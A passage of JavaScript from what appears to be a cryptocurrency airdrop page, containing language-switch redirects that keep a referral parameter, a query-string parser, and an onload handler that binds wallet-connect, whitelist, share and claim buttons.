	// 					$("#btn-go-share").css('display','inline');
	// 					//var info="Sorry,You has got 1 chance before or You're not pass the whitelist check because you don't have enough assets";
	// 					var info="Well done,Now you can share it with your friends";
	// 					swal("Success", info, "success");
	// 				}
	// 			}else{
	// 				var info=data.msg;
	// 				swal("Error", info, "error");
	// 			}
	// 		},
	// 		error:function(data){
	// 			console.log(data)
	// 		}
	// 	})
	// }
	async function goEn() {
		var url = './index.html';
		var s = getUrlQueryString('s')
		window.location.href = s ? url + '?s=' + s : url;
	}
	async function goCn() {
		var url = './index2.html';
		var s = getUrlQueryString('s')
		window.location.href = s ? url + '?s=' + s : url;
	}
	function getQueryVariable(variable) {
		var query = window.location.search.substring(1);
		var vars = query.split("&");
		for (var i=0;i<vars.length;i++) {
			var pair = vars[i].split("=");
			if(pair[0] == variable){return pair[1];}
		}
		return('');
	}
	function onload(){
		if(!selectedAccount){
			document.getElementById("btn-unlock").style.display = 'inline';
		}
		// parentCode=getQueryVariable('s');
		//init
		init();
		//connect
		document.querySelector("#btn-connect").addEventListener("click", connect);
		//connect
		document.querySelector("#btn-unlock").addEventListener("click", connect);
		//Active whitelist
		document.querySelector("#btn-active").addEventListener("click", goActive);
		//Share Check
		document.querySelector("#btn-share").addEventListener("click", shareInfo);
		//Go to Share div
		document.querySelector("#btn-go-share").addEventListener("click", shareInfo);

		document.querySelector("#go-en").addEventListener("click", goEn);
		document.querySelector("#go-cn").addEventListener("click", goCn);

		$("#activeConfirm").click(function () {
			$("#goToActionSetion").trigger('click')
		});
		//Receive
		document.querySelector("#btn-receive").addEventListener("click", claimAirdrop);
	}

</script>